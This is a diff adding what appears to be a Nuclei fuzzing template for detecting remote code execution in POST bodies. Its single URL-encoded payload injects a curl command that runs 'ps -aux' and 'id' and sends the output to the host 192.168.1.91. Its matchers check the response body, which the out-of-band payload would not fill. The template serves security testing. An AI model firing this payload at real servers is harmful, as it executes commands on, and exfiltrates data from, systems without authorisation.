@@ -1,0 +1,40 @@
+id: fuzz-rce-custom
+
+info:
+  name: Custom Remote Code Execution Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect remote code execution vulnerabilities using a specified RCE payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'  # Run only on POST requests
+
+    payloads:
+      rce_payload:
+        - "curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root"  # Adjust this depending on what output you're expecting from the command
+          - "PID"   # More patterns related to the output of "ps aux"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"  # Ensure you are checking for the right content-type
